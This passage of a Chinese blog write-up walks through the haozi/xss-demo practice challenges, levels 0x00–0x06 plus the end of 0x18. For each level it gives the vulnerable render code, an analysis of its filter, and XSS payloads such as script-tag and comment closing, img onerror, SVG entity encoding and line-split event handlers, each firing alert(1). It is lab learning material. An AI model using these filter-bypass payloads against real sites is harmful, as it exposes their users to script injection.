class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-18\"><a href=\"#分析-18\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造闭合</span><br><span class=\"line\">1. 可以用”)闭合console.log(\",后利用注释</span><br><span class=\"line\">2. 用<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>闭合<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-18\"><a href=\"#input-code-18\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. \\<span class=\"string\">\");alert(1)&lt;!-- 或 \\\"</span>);alert(<span class=\"number\">1</span>)//</span><br><span class=\"line\"><span class=\"number\">2</span>. </span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-18\"><a href=\"#html-18\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\\\\"</span>);alert(<span class=\"string\">`1`</span>);<span class=\"xml\"><span class=\"comment\">&lt;!--\");</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2.</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">\");</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/012.png\" alt=\"012\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"haozi-xss-demo笔记\"><a href=\"#haozi-xss-demo笔记\" class=\"headerlink\" title=\"haozi/xss-demo笔记\"></a>haozi/xss-demo笔记</h1><p>在线xss题目,用于xss学习,弹出alert(1)就过关.</p>\n<p>地址:<a href=\"https://xss.haozi.me\" target=\"_blank\" rel=\"noopener\">https://xss.haozi.me</a></p>\n<p>项目: <a href=\"https://github.com/haozi/xss-demo\" target=\"_blank\" rel=\"noopener\">https://github.com/haozi/xss-demo</a> ,有提供的答案<a href=\"https://github.com/haozi/xss-demo/issues/1\" target=\"_blank\" rel=\"noopener\">https://github.com/haozi/xss-demo/issues/1</a></p>\n<p>自带alert(1)的js地址：<a href=\"https://xss.haozi.me/j.js\" target=\"_blank\" rel=\"noopener\">https://xss.haozi.me/j.js</a></p>\n<h1 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h1><h2 id=\"server-code\"><a href=\"#server-code\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;div&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/div&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有过滤,在&lt;<span class=\"keyword\">div</span>&gt;标签中输出</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code\"><a href=\"#input-code\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 利用外联方式 </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert(1)'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">5.  利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">4. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert(1)'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">5. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/000.png\" alt=\"000\"></p>\n<h1 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h1><h2 id=\"server-code-1\"><a href=\"#server-code-1\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;textarea&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/textarea&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在<span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span>中,没有过滤,构造闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-1\"><a href=\"#input-code-1\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-1\"><a href=\"#html-1\" class=\"headerlink\" title=\"html:\"></a>html:</h2> <figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/001.png\" alt=\"001\"></p>\n<h1 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h1><h2 id=\"server-code-2\"><a href=\"#server-code-2\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (input) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"type\">'&lt;input</span> <span class=\"keyword\">type</span>=<span class=\"string\">\"name\"</span> value=<span class=\"string\">\"' + input + '\"</span>&gt;'</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在<span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span>中,没有过滤,双引号闭合,构造双引号闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-2\"><a href=\"#input-code-2\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-2\"><a href=\"#html-2\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\"&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/002.png\" alt=\"002\"></p>\n<h1 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h1><h2 id=\"server-code-3\"><a href=\"#server-code-3\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  const stripBracketsRe = /[()]/g</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(stripBracketsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">input</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了<span class=\"comment\">()</span>,想办法用其他方式代替<span class=\"comment\">()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-3\"><a href=\"#input-code-3\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2. </span><br><span class=\"line\">    利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"> 3. 利用外联</span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"> 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-3\"><a href=\"#html-3\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">4. <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/003.png\" alt=\"003\"></p>\n<h1 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h1><h2 id=\"server-code-4\"><a href=\"#server-code-4\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  const stripBracketsRe = /[()`]/g</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(stripBracketsRe, <span class=\"string\">''</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">input</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">多过滤了`</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-4\"><a href=\"#input-code-4\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\">    利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"> 2. 利用外联</span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"> 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-4\"><a href=\"#html-4\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"alert&amp;#x28;&amp;#x31;&amp;#x29;\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/004.png\" alt=\"004\"></p>\n<h1 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h1><h2 id=\"server-code-5\"><a href=\"#server-code-5\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function render (input) &#123;</span><br><span class=\"line\">  input = input.replace(/--&gt;/g, '😂')</span><br><span class=\"line\">  return '<span class=\"comment\">&lt;!-- ' + input + ' --&gt;</span>'</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造闭合</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-5\"><a href=\"#input-code-5\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. --!&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-5\"><a href=\"#html-5\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"comment\">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/005.png\" alt=\"005\"></p>\n<h1 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h1><h2 id=\"server-code-6\"><a href=\"#server-code-6\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/auto|on.*=|&gt;/ig, <span class=\"string\">'_'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> `&lt;<span class=\"built_in\">input</span> value=<span class=\"number\">1</span> $&#123;<span class=\"built_in\">input</span>&#125; <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;`</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤&gt;和以auto开头或者<span class=\"keyword\">on</span>开头，=等号结尾的标签属性并替换成<span class=\"title\">_</span>，且忽略大小写；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1.</span> 可以先定义type=<span class=\"string\">'image'</span>,等价于img标签的方法了。 然后利用换行使=与onerror隔开</span><br><span class=\"line\"><span class=\"number\">2.</span> 用<span class=\"keyword\">on</span>开头的触发事件</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-6\"><a href=\"#input-code-6\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. </span><br><span class=\"line\"><span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2</span>.onmouseover</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-6\"><a href=\"#html-6\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. &lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> <span class=\"built_in\">type</span>='image' src='' onerror</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;input <span class=\"built_in\">value</span>=<span class=\"number\">1</span> onmouseover</span><br><span class=\"line\">=alert(<span class=\"number\">1</span>) <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img 